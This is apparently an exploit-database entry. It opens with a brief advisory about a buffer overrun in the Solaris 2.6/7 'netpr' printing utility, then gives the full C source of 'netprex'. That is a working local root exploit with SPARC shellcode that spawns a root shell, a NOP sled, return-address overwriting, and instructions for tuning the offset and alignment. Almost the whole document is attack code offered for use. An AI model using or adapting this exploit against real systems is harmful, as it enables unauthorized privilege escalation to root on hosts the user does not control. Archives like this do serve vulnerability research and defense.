source: http://www.securityfocus.com/bid/1200/info

A buffer overrun exists in the 'netpr' program, part of the SUNWpcu (LP) package included with Solaris, from Sun Microsystems. Versions of netpr on Solaris 2.6 and 7, on both Sparc and x86 have been confirmed as being vulnerable. The overflow is present in the -p option, normally used to specify a printer. By specifying a long buffer containing machine executable code, it is possible to execute arbitrary commands as root. On Sparc, the exploits provided will spawn a root shell, whereas on x86 it will create a setuid root shell in /tmp.

/**  
***  netprex - SPARC Solaris root exploit for /usr/lib/lp/bin/netpr
***  
***  Tested and confirmed under Solaris 2.6 and 7 (SPARC) 
***  
***  Usage:  % netprex -h hostname [-o offset] [-a alignment]
***  
***  where hostname is the name of any reachable host running the printer
***  service on TCP port 515 (such as "localhost" perhaps), offset is the
***  number of bytes to add to the %sp stack pointer to calculate the
***  desired return address, and alignment is the number of bytes needed
***  to correctly align the first NOP inside the exploit buffer.
***     
***  When the exploit is run, the host specified with the -h option will
***  receive a connection from the netpr program to a nonsense printer
***  name, but the host will be otherwise untouched.  The offset parameter
***  and the alignment parameter have default values that will be used
***  if no overriding values are specified on the command line.  In some
***  situations the default values will not work correctly and should
***  be overridden on the command line.  The offset value should be a
***  multiple of 8 and should lie reasonably close to the default value;
***  try adjusting the value by -640 to 640 from the default value in
***  increments of 64 for starters.  The alignment value should be set
***  to either 0, 1, 2, or 3.  In order to function correctly, the final
***  return address should not contain any null bytes, so adjust the offset
***  appropriately to counteract nulls should any arise.
***  
***  Cheez Whiz / ADM
***  cheezbeast@hotmail.com
***  
***  May 23, 1999
**/  

/*      Copyright (c) 1999 ADM  */
/*        All Rights Reserved   */

/*      THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF ADM      */
/*      The copyright notice above does not evidence any        */
/*      actual or intended publication of such source code.     */

#define BUFLEN 1087
#define NOPLEN 932 
#define ADDRLEN 80 

#define OFFSET 1600             /* default offset */
#define ALIGNMENT 1             /* default alignment */

#define NOP 0x801bc00f          /* xor %o7,%o7,%g0 */

#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shell[] =
/* setuid:                                                 */
/*  0 */ "\x90\x1b\xc0\x0f"  /* xor %o7,%o7,%o0            */   
/*  4 */ "\x82\x10\x20\x17"  /* mov 23,%g1                 */   
/*  8 */ "\x91\xd0\x20\x08"  /* ta 8                       */   
/* alarm:                                                  */
/* 12 */ "\x90\x1b\xc0\x0f"  /* xor %o7,%o7,%o0            */
/* 16 */ "\x82\x10\x20\x1b"  /* mov 27,%g1                 */
/* 20 */ "\x91\xd0\x20\x08"  /* ta 8                       */
/* execve:                                                 */
/* 24 */ "\x2d\x0b\xd8\x9a"  /* sethi %hi(0x2f62696e),%l6  */
/* 28 */ "\xac\x15\xa1\x6e"  /* or %l6,%lo(0x2f62696e),%l6 */
/* 32 */ "\x2f\x0b\xdc\xda"  /* sethi %hi(0x2f736800),%l7  */
/* 36 */ "\x90\x0b\x80\x0e"  /* and %sp,%sp,%o0            */
/* 40 */ "\x92\x03\xa0\x08"  /* add %sp,8,%o1              */
/* 44 */ "\x94\x1b\xc0\x0f"  /* xor %o7,%o7,%o2            */
/* 48 */ "\x9c\x03\xa0\x10"  /* add %sp,16,%sp             */
/* 52 */ "\xec\x3b\xbf\xf0"  /* std %l6,[%sp-16]           */
/* 56 */ "\xd0\x23\xbf\xf8"  /* st %o0,[%sp-8]             */
/* 60 */ "\xc0\x23\xbf\xfc"  /* st %g0,[%sp-4]             */
/* 64 */ "\x82\x10\x20\x3b"  /* mov 59,%g1                 */
/* 68 */ "\x91\xd0\x20\x08"; /* ta 8                       */

extern char *optarg;

unsigned long int
get_sp()
{
    __asm__("or %sp,%sp,%i0");
}

int
main(int argc, char *argv[]) 
{
    unsigned long int sp, addr; 
    int c, i, offset, alignment;
    char *program, *hostname, buf[BUFLEN+1], *cp;          

    program = argv[0];
    hostname = "localhost";  
    offset = OFFSET;
    alignment = ALIGNMENT;

    while ((c = getopt(argc, argv, "h:o:a:")) != EOF) {
        switch (c) {
        case 'h':
            hostname = optarg;
            break;
        case 'o':
            offset = (int) strtol(optarg, NULL, 0);
            break;
        case 'a':
            alignment = (int) strtol(optarg, NULL, 0);
            break;
        default:
            fprintf(stderr, "usage: %s -h hostname [-o offset] "
                    "[-a alignment]\n", program);
            exit(1);
            break;
        }
    }
    memset(buf, '\xff', BUFLEN);
    for (i = 0, cp = buf + alignment; i < NOPLEN / 4; i++) {
        *cp++ = (NOP >> 24) & 0xff;
        *cp++ = (NOP >> 16) & 0xff;
        *cp++ = (NOP >>  8) & 0xff;
        *cp++ = (NOP >>  0) & 0xff;
    }       
    memcpy(cp, shell, strlen(shell));
    sp = get_sp(); addr = sp + offset; addr &= 0xfffffff8;
    for (i = 0, cp = buf + BUFLEN - ADDRLEN; i < ADDRLEN / 4; i++) {
        *cp++ = (addr >> 24) & 0xff;
        *cp++ = (addr >> 16) & 0xff;
        *cp++ = (addr >>  8) & 0xff;
        *cp++ = (addr >>  0) & 0xff;
    }   
    buf[BUFLEN] = '\0';
    fprintf(stdout, "%%sp 0x%08lx offset %d --> return address 0x%08lx [%d]\n",
            sp, offset, addr, alignment);
    execle("/usr/lib/lp/bin/netpr",
           "netpr",
           "-I", "ADM-ADM",
           "-U", "ADM!ADM",
           "-p", buf,
           "-d", hostname,
           "-P", "bsd", 
           "/etc/passwd", NULL, NULL);
    fprintf(stderr, "unable to exec netpr: %s\n", strerror(errno));
    exit(1);
}   